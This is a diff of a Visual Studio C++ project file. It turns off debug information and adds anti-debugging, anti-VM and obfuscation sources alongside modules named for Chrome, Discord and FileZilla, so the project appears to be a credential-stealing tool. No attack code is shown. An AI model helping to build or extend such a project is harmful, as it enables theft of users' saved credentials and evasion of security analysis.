@@ -43,7 +43,7 @@
     <ConfigurationType>Application</ConfigurationType>
     <UseDebugLibraries>true</UseDebugLibraries>
     <PlatformToolset>v143</PlatformToolset>
-    <CharacterSet>Unicode</CharacterSet>
+    <CharacterSet>MultiByte</CharacterSet>
     <WholeProgramOptimization>true</WholeProgramOptimization>
   </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
@@ -103,10 +103,11 @@
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions);_CRT_SECURE_NO_WARNINGS</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
       <LanguageStandard>stdcpp20</LanguageStandard>
       <LanguageStandard_C>stdc17</LanguageStandard_C>
+      <DebugInformationFormat>None</DebugInformationFormat>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -136,23 +137,30 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="ext\sqlite3.c" />
+    <ClCompile Include="src\antidebug.cpp" />
+    <ClCompile Include="src\antivm.cpp" />
     <ClCompile Include="src\chrome.cpp" />
     <ClCompile Include="src\discord.cpp" />
     <ClCompile Include="src\filezilla.cpp" />
+    <ClCompile Include="src\globals.cpp" />
     <ClCompile Include="src\goop.cpp" />
     <ClCompile Include="src\goopbase.cpp" />
     <ClCompile Include="src\main.cpp" />
     <ClCompile Include="src\misc.cpp" />
+    <ClCompile Include="src\obfuscation.h" />
     <ClCompile Include="src\system.cpp" />
     <ClCompile Include="src\utils.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="ext\nlohmann\json.hpp" />
     <ClInclude Include="ext\sqlite3.h" />
+    <ClInclude Include="src\antidebug.h" />
+    <ClInclude Include="src\antivm.h" />
     <ClInclude Include="src\chrome.h" />
     <ClInclude Include="src\config.h" />
     <ClInclude Include="src\discord.h" />
     <ClInclude Include="src\filezilla.h" />
+    <ClInclude Include="src\globals.h" />
     <ClInclude Include="src\goop.h" />
     <ClInclude Include="src\goopbase.h" />
     <ClInclude Include="src\misc.h" />
